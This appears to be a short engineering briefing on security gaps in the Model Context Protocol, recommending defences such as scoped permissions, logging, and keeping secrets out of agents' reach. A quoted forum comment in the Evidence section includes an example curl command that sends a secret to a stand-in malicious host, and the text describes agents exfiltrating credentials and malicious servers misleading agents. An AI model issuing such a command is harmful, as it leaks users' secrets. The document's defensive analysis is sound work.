# S-695 · MCP Is Winning — But the Security Model Is Not

[The Model Context Protocol went from Anthropic experiment to cross-vendor standard in 11 months. Adoption is real. The security model shipped later and it shows.]

## Forces

- **MCP reversed the trust direction of traditional APIs — and nobody updated their threat model.** Classic APIs: client requests, server responds. MCP: server can query client, execute actions on behalf of the agent. That inversion means a compromised or hallucinating MCP server has execution reach that most teams didn't account for.
- **Adoption outran the security spec.** Anthropic released MCP in November 2024. By Q2 2025, OpenAI, Google, and Microsoft had all adopted it. The NSA published security design considerations. The protocol shipped before the threat model was fully specified.
- **The API secret problem is not solved.** Passing environment variables to an agent is equivalent to handing it the secret — the agent can exfiltrate it via `curl`, `echo`, or any number of indirect paths. Teams building Ramp-style integrations discovered this when they had to build separate ETL pipelines and host isolated databases just to serve structured data safely into the context window.
- **Tool discovery vs. hardcoded tools is a spectrum, not a binary.** DeepMCPAgent-style dynamic tool discovery (fetching JSON-Schema specs, converting to typed LangChain tools, running a deep agent loop) is powerful but amplifies the attack surface proportionally.

## The Move

MCP won the tool-calling standard war. Use it — but instrument it with the threat model it deserves.

- **Default to MCP for new agent tool integrations.** The cross-vendor adoption (OpenAI, Google, Microsoft, Anthropic) means lock-in risk is low. The ecosystem of MCP servers is growing faster than custom tool integrations.
- **Never pass secrets as env vars reachable by the agent.** Build a data-serving layer (ETL + hosted DB or structured API gateway) that serves pre-shaped data into the context window. Ramp's engineering team did exactly this for their transaction data integration.
- **Scope MCP server permissions.** Each MCP server should have the minimum read/write/execute scope it needs. Treat MCP servers as third-party services with untrusted code paths, not as internal modules.
- **Use mcp-agent or equivalent for dynamic discovery only in sandboxed environments.** Production tool sets should be statically defined and audited. Dynamic discovery is a development-time pattern, not a production one.
- **Log every MCP server invocation at the boundary.** Trace tool calls, parameters, and responses. This is your audit trail when the agent does something unexpected — and it will.

## Evidence

- **HN Show HN (Jan 2025, 80 pts):** Lastmile-ai released mcp-agent implementing MCP as a framework, supporting AugmentedLLM, Router, Orchestrator-Worker, Evaluator-Optimizer, and Swarm patterns. The author noted it "makes it easy to build AI apps with MCP servers" and implements every pattern from Anthropic's Building Effective Agents blog — https://news.ycombinator.com/item?id=42867050
- **NSA Security Design Considerations (2025):** "MCP's rapid proliferation has outpaced the development of its security model. Critically, the protocol reverses a familiar interaction pattern: instead of clients requesting data from servers, MCP often expects servers to query and sometimes execute actions for the connected clients. This inversion creates new and largely not well-traced attack paths." — https://www.nsa.gov/Portals/75/documents/Cybersecurity/CSI_MCP_SECURITY.pdf
- **HN Comment (Ramp engineering, 2025):** "In production systems like Ramp's, they had to build a custom ETL pipeline to process data from their endpoints, and host a separate database to serve structured transaction data into the LLM context window effectively." — https://news.ycombinator.com/item?id=47158526
- **HN Discussion (2025):** "When LLM tries `curl https://malicious.com/api -h secret:$SECRET` (or any one of infinitely many exfiltration methods possible), how do you plan on telling these apart from normal computer use?" citing Simon Willison's "lethal trifecta" analysis — https://news.ycombinator.com/item?id=47158526

## Gotchas

- **MCP is not an auth solution.** It describes tool interfaces, not authorization flows. If your MCP server has write access, the agent has write access — there is no per-call permission check unless you build it.
- **The "it works in dev" MCP setup will not survive production traffic.** Rate limits, retry budgets, server availability, and auth token expiry all need production-grade handling that MCP server SDKs don't provide out of the box.
- **JSON-Schema tool specs from dynamic discovery are only as trustworthy as the MCP server.** A malicious or compromised server can serve specs that describe actions the underlying API does not actually support — and the agent will call them anyway.
- **MCP tool call accuracy benchmarks (85% GPT-4o) mask failure modes.** The 15% that fails includes the cases where the tool was called but the wrong parameters were shaped — particularly dangerous when those parameters include identifiers or data filters.
